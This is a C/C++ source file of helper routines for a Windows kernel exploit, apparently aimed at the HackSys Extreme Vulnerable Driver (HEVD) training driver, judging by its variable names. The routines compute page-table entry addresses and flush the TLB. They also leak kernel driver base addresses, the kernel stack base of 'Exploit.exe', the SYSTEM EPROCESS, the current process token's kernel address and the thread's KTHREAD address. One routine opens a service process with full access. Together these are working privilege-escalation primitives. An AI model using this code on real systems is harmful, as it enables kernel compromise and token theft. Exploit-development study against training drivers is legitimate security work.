#include "Common.h"

// getPteAddress
uintptr_t getPteAddress(PVOID addr, PVOID base)
{
	uintptr_t address = (uintptr_t)addr;
	address = address >> 9;
	address &= 0x7FFFFFFFF8;
	address += (intptr_t)base;
	return address;
}

// sprayTLBCache
void sprayTLBCache() {
	void* arr[CACHE_SPRAY_SIZE * 20];
	char arr2[CACHE_SPRAY_SIZE * 20];
	int idx = 0;

	printf("[*] Invalidating  TLB cache\n");
	for (int c = 0; c < 20; c++) {
		DWORD_PTR res = SetThreadAffinityMask(GetCurrentThread(), 1 << c);
		if (!res)
			continue;
		printf("  Core: %d\n", c);
		for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
			idx = c * CACHE_SPRAY_SIZE + i;
			arr[idx] = malloc(4096);
			*(char*)arr[idx] = 1;
			arr2[idx] = *(char*)arr[idx];
			*(char*)arr[idx] = arr2[idx] + 2;
		}
	}
	printf("[*] Finished invalidating TLB cache\n");
	_mm_sfence();
}


// getBaseAddr
ULONGLONG getBaseAddr(LPCWSTR drvname)
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int nDrivers, i = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		WCHAR szDrivers[1024];
		nDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < nDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
			{
				if (wcscmp(szDrivers, drvname) == 0)
				{
					return (ULONGLONG)drivers[i];
				}
			}
		}
	}
	return 0;
}


// getDriverDataSection
DWORD getDriverDataSection(const char* path) {
	HANDLE hHevdLocalBase = LoadLibraryExA(path, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hHevdLocalBase) {
		printf("[-] Failed to load driver: %d\n", GetLastError());
		exit(-1);
	}
	PIMAGE_NT_HEADERS imageHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)hHevdLocalBase + ((PIMAGE_DOS_HEADER)hHevdLocalBase)->e_lfanew);
	ULONG_PTR sectionLocation = (ULONG_PTR)IMAGE_FIRST_SECTION(imageHeader);
	DWORD dataSectionOffset = 0;

	for (int i = 0; i < imageHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hevdSection = (PIMAGE_SECTION_HEADER)sectionLocation;
		const char* name = (const char*)hevdSection->Name;
		if (strcmp(name, ".data") == 0) {
			dataSectionOffset = hevdSection->VirtualAddress;
		}
		sectionLocation += sizeof(IMAGE_SECTION_HEADER);
	}
	if (dataSectionOffset == 0) {
		printf("[-] Failed locating the .data section\n");
		exit(-1);
	}
	printf("[+] Offset of .data section is: %d\n", dataSectionOffset);
	return dataSectionOffset;
}


// leakStackBase
StackInfo leakStackBase(const char* path) {
	StackInfo stackInfo{};
	HMODULE ntdll = GetModuleHandleA("ntdll");
	_NtQuerySystemInformation query = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("[-] GetProcAddress(NtQuerySystemInformation) failed.\n");
		exit(-1);
	}
	ULONG len = 2000;
	NTSTATUS status = NULL;
	PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
	do {
		len *= 2;
		pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
	} while (status == STATUS_INFO_LENGTH_MISMATCH);
	if (status != STATUS_SUCCESS) {
		printf("[-] NtQuerySystemInformation failed with error code 0x%X\n", status);
		exit(-1);
	}

	UNICODE_STRING myProc = { 0 };
	my_RtlInitUnicodeString myRtlInitUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
	my_RtlEqualUnicodeString myRtlEqualUnicodeString = (my_RtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
	if (myRtlInitUnicodeString == NULL || myRtlEqualUnicodeString == NULL) {
		printf("[-] Failed initializing unicode functions\n");
		exit(-1);
	}

	myRtlInitUnicodeString(&myProc, L"Exploit.exe");
	printf("[+] Iterating processes threads, looking for kernel stack address\n");
	PVOID stackLimit = NULL;
	while (pProcessInfo != NULL) {
		if (myRtlEqualUnicodeString(&(pProcessInfo->ImageName), &myProc, TRUE)) {
			printf("  Process: %wZ\n", pProcessInfo->ImageName);
			for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
				PVOID stackBase = pProcessInfo->Threads[i].StackBase;
				stackLimit = pProcessInfo->Threads[i].StackLimit;
				stackInfo.Base = stackBase;
				stackInfo.Limit = stackLimit;
				return stackInfo;
			}
		}

		if (!pProcessInfo->NextEntryOffset) {
			pProcessInfo = NULL;
		}
		else {
			pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
		}
	}
	return stackInfo;
}


// getSystemEProcess
QWORD getSystemEProcess() {
	ULONG returnLenght = 0;
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
	SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[0];
	return (QWORD)handleInfo.Object;
}


// GetServiceHandle ...
HRESULT GetServiceHandle(_In_ LPCWSTR ServiceName, _Out_ PHANDLE ProcessHandle) {
	SC_HANDLE hScm, hRpc;
	BOOL bRes;
	SERVICE_STATUS_PROCESS procInfo;
	HRESULT hResult;
	DWORD dwBytes;
	HANDLE hProc;
	hScm = NULL;
	hRpc = NULL;

	// Connect to the SCM
	hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (hScm == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[-] OpenScManager failed with error %d\n", hResult);
		exit(-1);
	}

	// Open the service
	hRpc = OpenService(hScm, ServiceName, SERVICE_QUERY_STATUS);
	if (hRpc == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[-] OpenService failed with error %d\n", hResult);
		exit(-1);
	}

	// Query the process information
	bRes = QueryServiceStatusEx(hRpc,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&procInfo,
		sizeof(procInfo),
		&dwBytes);
	if (bRes == FALSE)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[-] QueryServiceStatusEx failed with error %d\n", hResult);
		exit(-1);
	}

	// Open a handle for all access to the PID
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
	if (hProc == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[-] OpenProcess failed with error %d\n", hResult);
		exit(-1);
	}

	*ProcessHandle = hProc;
	hResult = ERROR_SUCCESS;
	if (hRpc != NULL)
	{
		CloseServiceHandle(hRpc);
	}
	if (hScm != NULL)
	{
		CloseServiceHandle(hScm);
	}
	return hResult;
}


HRESULT GetTokenObjectIndex(_Out_ PULONG TokenIndex){
	HANDLE hToken;
	BOOL bRes;
	NTSTATUS status;
	struct{
		OBJECT_TYPE_INFORMATION TypeInfo;
		WCHAR TypeNameBuffer[sizeof("Token")];
	} typeInfoWithName;

	// Open the current process token
	bRes = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	if (bRes == FALSE) {
		return HRESULT_FROM_WIN32(GetLastError());
	}

	HMODULE ntdll = GetModuleHandleA("ntdll");
	_NtQueryObject queryObj = (_NtQueryObject)GetProcAddress(ntdll, "NtQueryObject");

	status = queryObj(hToken, ObjectTypeInformation, &typeInfoWithName, sizeof(typeInfoWithName), NULL);
	CloseHandle(hToken);
	if (!NT_SUCCESS(status))
	{
		return HRESULT_FROM_NT(status);
	}

	*TokenIndex = typeInfoWithName.TypeInfo.TypeIndex;
	return ERROR_SUCCESS;
}


HRESULT GetProcessTokenAddress(_In_ HANDLE tokenHandle, _Out_ PVOID* HandleAddress) {
	NTSTATUS status;

	SYSTEM_HANDLE_INFORMATION localInfo;
	PSYSTEM_HANDLE_INFORMATION handleInfo = &localInfo;

	ULONG bytes;
	ULONG tokenIndex;
	ULONG i;
	HRESULT hResult;

	*HandleAddress = 0;
	// Get the Object Type Index for Token Objects so we can recognize them
	hResult = GetTokenObjectIndex(&tokenIndex);
	if (FAILED(hResult))
	{
		printf("Failed to get token\n");
		exit(-1);
	}

	// Check how big the handle table is
	HMODULE ntdll = GetModuleHandleA("ntdll");
	_NtQuerySystemInformation queryInfo = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");

	status = queryInfo(SystemHandleInformation,	handleInfo, sizeof(*handleInfo), &bytes);
	if (NT_SUCCESS(status))
	{
		printf("[!] NtQuerySystemInformation failed: 0x%x\n", status);
		hResult = ERROR_UNIDENTIFIED_ERROR;
		exit(-1);
	}

	// Add space for 100 more handles and try again
	bytes += 100 * sizeof(*handleInfo);
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
	status = queryInfo(SystemHandleInformation,	handleInfo, bytes, &bytes);
	if (!NT_SUCCESS(status) || !handleInfo)
	{
		hResult = HRESULT_FROM_NT(status);
		printf("[!] NtQuerySystemInformation #2 failed: 0x%x\n", status);
		exit(-1);
	}

	// Enumerate each one
	for (i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		// Check if it's the token of this process
		if ((handleInfo->Handles[i].ObjectTypeIndex == tokenIndex) &&
			(handleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId()) &&
			((HANDLE)handleInfo->Handles[i].HandleValue == tokenHandle))
		{
			printf("[*] Found current process token\n");
			*HandleAddress = handleInfo->Handles[i].Object;
		}
	}
	// Free the handle list if we had one
	if (handleInfo != &localInfo)
	{
		HeapFree(GetProcessHeap(), 0, handleInfo);
	}
	return hResult;
}

PVOID GetkThread()
{
	NTSTATUS nt_status;
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread)
	{
		printf("[!] Error while getting the thread ID: %d\n", GetLastError());
		exit(1);
	}

	_NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation)
	{
		printf("[!] Error while resolving NtQuerySystemInformation: %d\n", GetLastError());
		exit(1);
	}

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}
	if (nt_status != 0x0)
	{
		printf("[!] Error while calling NtQuerySystemInformation to obtain the SystemHandleInformation.\n");
		exit(1);
	}

	int z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
		{
			if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
			{
				z++;
			}
		}
	}

	int array_size = z - 1;
	PVOID* kThread_array = new PVOID[array_size];
	z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
		{
			if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
			{
				kThread_array[z] = system_handle_info->Handles[i].Object;
				z++;
			}
		}
	}

	printf("[+] KTHREAD address: %p\n", kThread_array[array_size]);
	return kThread_array[array_size];
}


DWORD FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}